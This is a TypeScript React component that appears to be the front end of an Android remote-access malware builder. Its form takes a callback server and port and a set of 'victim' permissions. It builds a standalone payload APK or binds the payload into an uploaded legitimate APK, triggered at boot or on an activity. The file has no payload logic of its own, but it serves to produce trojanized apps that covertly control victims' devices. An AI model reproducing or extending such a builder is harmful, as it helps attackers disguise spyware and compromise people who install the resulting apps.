import './GenerateAPK.scss';

import {
    Button,
    Checkbox,
    Divider,
    Field,
    InfoLabel,
    Input,
    Radio,
    RadioGroup,
} from '@fluentui/react-components';
import { Dismiss24Regular } from '@fluentui/react-icons';
import { faHammer } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { useFormik } from 'formik';
import React, { useRef, useState } from 'react';
import { useNavigate } from 'react-router';
import * as Yup from 'yup';

import {
    BindingMethod,
    PackagingMode,
    VictimOrder,
} from '../../../../common/enums';
import { type IGenerateAPKPayload } from '../../../../common/interfaces/IGenerateAPKPayload';
import {
    BindingMethodTextMap,
    BindingMethodWarningTextMap,
    VictimOrderPermissionTextMap,
} from '../../../utils/Mappings';

const regexIP = /^((25[0-5]|(2[0-4]|1[0-9]|[1-9]|)[0-9])(\.(?!$)|$)){4}$/;
const regexHost =
    /^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9-]*[A-Za-z0-9])$/;

interface IGenerateAPKPayloadWithFile extends IGenerateAPKPayload {
    existingAPK: File | null;
}

export const GenerateAPK: React.FC = () => {
    const navigate = useNavigate();

    const [resetFileInput, setResetFileInput] = useState(1);

    const fileInputRef = useRef<HTMLInputElement>(null);

    const {
        isSubmitting,
        isValid,
        errors,
        touched,
        values,
        setFieldTouched,
        setFieldValue,
        handleBlur,
        handleChange,
        handleSubmit,
    } = useFormik<IGenerateAPKPayloadWithFile>({
        initialValues: {
            server: '',
            port: 42474,
            permissions: [],
            packagingMode: PackagingMode.STANDALONE,
            existingAPK: null,
            bindingMethod: BindingMethod.BOOT,
        },
        validationSchema: Yup.object().shape({
            server: Yup.string()
                .test(
                    'is-valid-host',
                    'Server should be a valid DNS host or IP address',
                    (value) => {
                        console.log(
                            value,
                            regexIP.test(value ?? ''),
                            regexHost.test(value ?? ''),
                        );
                        return (
                            value === undefined ||
                            regexIP.test(value) ||
                            regexHost.test(value)
                        );
                    },
                )
                .required('Server is required'),
            port: Yup.number().required('Required'),
            permissions: Yup.array(
                Yup.string().oneOf(Object.values(VictimOrder)),
            ).required('Required'),
            packagingMode: Yup.string()
                .oneOf(Object.values(PackagingMode))
                .required('Required'),
            existingAPK: Yup.mixed().when(
                'packagingMode',
                ([packagingMode], schema) => {
                    if (packagingMode === PackagingMode.BIND_TO_EXISTING_APK) {
                        return schema.required('Required');
                    } else {
                        return schema.notRequired();
                    }
                },
            ),
        }),
        onSubmit: async (values) => {
            const formData = new FormData();

            formData.append('server', values.server);
            formData.append('port', values.port.toString());
            formData.append('permissions', values.permissions.join(','));
            formData.append('packagingMode', values.packagingMode);
            formData.append('bindingMethod', values.bindingMethod);

            if (
                values.packagingMode === PackagingMode.BIND_TO_EXISTING_APK &&
                values.existingAPK !== null
            ) {
                formData.append('existingAPK', values.existingAPK);
            }

            try {
                await axios.post('/api/payload/generate-apk', formData);

                navigate('/payload/list');
            } catch (error) {
                console.error('Failed to invoke generate APK!', error);
                // TODO: Show toast
            }
        },
    });

    return (
        <div className='page-container generate-apk'>
            <form onSubmit={handleSubmit}>
                <Divider>APK Configuration</Divider>
                <div className='grouped-fields'>
                    <Field
                        label='Server'
                        validationState={
                            touched.server === true &&
                            errors.server !== undefined
                                ? 'error'
                                : 'none'
                        }
                        validationMessage={
                            touched.server === true ? errors.server : ''
                        }
                    >
                        <Input
                            name='server'
                            value={values.server}
                            placeholder='182.132.xxx.xxx'
                            disabled={isSubmitting}
                            onBlur={handleBlur}
                            onChange={handleChange}
                        />
                    </Field>
                    <Field
                        label='Port'
                        validationState={
                            touched.port === true && errors.port !== undefined
                                ? 'error'
                                : 'none'
                        }
                        validationMessage={
                            touched.port === true ? errors.port : ''
                        }
                    >
                        <Input
                            name='port'
                            type='number'
                            value={values.port.toString()}
                            placeholder='42474'
                            disabled={isSubmitting}
                            onBlur={handleBlur}
                            onChange={handleChange}
                        />
                    </Field>
                </div>
                <Divider>Permissions</Divider>
                <div className='permissions'>
                    {Object.entries(VictimOrderPermissionTextMap).map(
                        (entry) => {
                            const [value, text] = entry as [
                                VictimOrder,
                                string,
                            ];

                            return (
                                <Checkbox
                                    key={value}
                                    value={value}
                                    label={text}
                                    disabled={isSubmitting}
                                    checked={values.permissions.includes(value)}
                                    onBlur={() => {
                                        setFieldTouched(
                                            'permissions',
                                            true,
                                        ).catch(() => {
                                            // Do nothing
                                        });
                                    }}
                                    onChange={(e, data) => {
                                        if (data.checked === true) {
                                            setFieldValue(
                                                'permissions',
                                                values.permissions.concat(
                                                    value,
                                                ),
                                            ).catch(() => {
                                                // Do nothing
                                            });
                                        } else {
                                            setFieldValue(
                                                'permissions',
                                                values.permissions.filter(
                                                    (permission) =>
                                                        permission !== value,
                                                ),
                                            ).catch(() => {
                                                // Do nothing
                                            });
                                        }
                                    }}
                                />
                            );
                        },
                    )}
                </div>
                <Divider>Package</Divider>
                <Field label='Packaging Mode'>
                    <RadioGroup
                        name='packagingMode'
                        value={values.packagingMode}
                        disabled={isSubmitting}
                        layout='horizontal'
                        onBlur={() => {
                            setFieldTouched('packagingMode', true).catch(() => {
                                // Do nothing
                            });
                        }}
                        onChange={(e, data) => {
                            setFieldValue(
                                'packagingMode',
                                data.value as PackagingMode,
                            ).catch(() => {
                                // Do nothing
                            });
                        }}
                    >
                        <Radio
                            label='Standalone'
                            value={PackagingMode.STANDALONE}
                        />
                        <Radio
                            label='Bind to Existing Applicaiton'
                            value={PackagingMode.BIND_TO_EXISTING_APK}
                        />
                    </RadioGroup>
                </Field>

                {[
                    values.packagingMode ===
                        PackagingMode.BIND_TO_EXISTING_APK && (
                        <>
                            <input
                                key={resetFileInput}
                                ref={fileInputRef}
                                name='existingAPK'
                                type='file'
                                accept='.apk'
                                onBlur={handleBlur}
                                onChange={(e) => {
                                    if (e.target.files !== null) {
                                        setFieldValue(
                                            'existingAPK',
                                            e.target.files[0],
                                        ).catch(() => {
                                            // Do nothing
                                        });
                                    }
                                }}
                                hidden
                            />
                            <Field
                                label='Existing APK'
                                className='file-input'
                                validationState={
                                    touched.existingAPK === true &&
                                    errors.existingAPK !== undefined
                                        ? 'error'
                                        : 'none'
                                }
                                validationMessage={
                                    touched.existingAPK === true
                                        ? errors.existingAPK
                                        : ''
                                }
                            >
                                <Input
                                    name='existingAPK'
                                    value={
                                        values.existingAPK?.name ?? 'No file'
                                    }
                                    disabled={isSubmitting}
                                    readOnly
                                />
                                <Button
                                    appearance='primary'
                                    disabled={isSubmitting}
                                    title='Browse for file'
                                    onClick={() => {
                                        setFieldTouched(
                                            'existingAPK',
                                            true,
                                        ).catch(() => {
                                            // Do nothing
                                        });
                                        fileInputRef.current?.click();
                                    }}
                                >
                                    Browse
                                </Button>
                                <Button
                                    disabled={
                                        isSubmitting ||
                                        values.existingAPK === null
                                    }
                                    icon={<Dismiss24Regular />}
                                    title='Remove file'
                                    onClick={() => {
                                        setFieldTouched(
                                            'existingAPK',
                                            true,
                                        ).catch(() => {
                                            // Do nothing
                                        });
                                        setFieldValue(
                                            'existingAPK',
                                            null,
                                        ).catch(() => {
                                            // Do nothing
                                        });
                                        setResetFileInput(resetFileInput + 1);
                                    }}
                                />
                            </Field>

                            <Field label='Binding Method'>
                                <RadioGroup
                                    name='bindingMethod'
                                    value={values.bindingMethod}
                                    disabled={isSubmitting}
                                    layout='horizontal'
                                    onBlur={handleBlur}
                                    onChange={handleChange}
                                >
                                    <Radio
                                        label={
                                            <InfoLabel
                                                label={
                                                    BindingMethodTextMap[
                                                        BindingMethod.BOOT
                                                    ]
                                                }
                                                info={
                                                    BindingMethodWarningTextMap[
                                                        BindingMethod.BOOT
                                                    ]
                                                }
                                            />
                                        }
                                        value={BindingMethod.BOOT}
                                    />
                                    <Radio
                                        label={
                                            <InfoLabel
                                                label={
                                                    BindingMethodTextMap[
                                                        BindingMethod.ACTIVITY
                                                    ]
                                                }
                                                info={
                                                    BindingMethodWarningTextMap[
                                                        BindingMethod.ACTIVITY
                                                    ]
                                                }
                                            />
                                        }
                                        value={BindingMethod.ACTIVITY}
                                    />
                                </RadioGroup>
                            </Field>
                        </>
                    ),
                ]}

                <Divider />
                <div className='actions'>
                    <Button
                        appearance='primary'
                        icon={<FontAwesomeIcon icon={faHammer} />}
                        type='submit'
                        disabled={isSubmitting || !isValid}
                    >
                        Generate APK
                    </Button>
                </div>
            </form>
        </div>
    );
};
